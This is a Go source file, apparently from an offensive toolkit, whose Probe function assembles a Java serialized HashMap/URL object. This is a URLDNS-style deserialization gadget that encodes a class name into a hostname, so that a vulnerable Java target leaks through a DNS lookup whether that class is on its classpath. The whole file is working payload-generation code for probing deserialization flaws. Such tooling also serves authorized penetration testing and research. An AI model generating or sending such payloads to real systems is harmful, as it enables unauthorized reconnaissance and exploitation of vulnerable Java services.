package payload

import (
	"encoding/binary"
	"log"
	"net/url"
	"strings"
)

// Probe probes classes in target system's classpaths
func Probe(u string, probeclass string, classname string) []byte {
	var (
		prefix  = []byte("\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x10\x00\x00\x00\x02t\x00\x00vr")
		midfix1 = []byte("\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00\x0cjava.net.URL\x96%76\x1a\xfc\xe4r\x03\x00\x07I\x00\x08hashCodeI\x00\x04portL\x00\tauthorityt\x00\x12Ljava/lang/String;L\x00\x04fileq\x00~\x00\x06L\x00\x04hostq\x00~\x00\x06L\x00\x08protocolq\x00~\x00\x06L\x00\x03refq\x00~\x00\x06xp\xff\xff\xff\xff\x00\x00\x04\xd2t")
		midfix2 = []byte("q\x00~\x00\x02t")
		postfix = []byte("t\x00\x04httppxq\x00~\x00\x02x")
	)

	if !strings.Contains(u, "://") {
		u = "http://" + u
	}

	_u, err := url.Parse(u)
	if err != nil {
		log.Fatal(err)
	}
	h := probeclass + "." + classname + "." + _u.Hostname()
	hp := probeclass + "." + classname + "." + _u.Host
	log.Printf("use probe host: %v", h)

	buf := make([]byte, 0)
	buf = append(postfix, buf...)
	buf = append([]byte(h), buf...)

	buf = append(make([]byte, 2), buf...)
	binary.BigEndian.PutUint16(buf, uint16(len(h)))

	buf = append(midfix2, buf...)
	buf = append([]byte(hp), buf...)

	buf = append(make([]byte, 2), buf...)
	binary.BigEndian.PutUint16(buf, uint16(len(hp)))

	buf = append(midfix1, buf...)
	buf = append([]byte(probeclass), buf...)

	buf = append(make([]byte, 2), buf...)
	binary.BigEndian.PutUint16(buf, uint16(len(probeclass)))

	buf = append(prefix, buf...)
	return buf
}
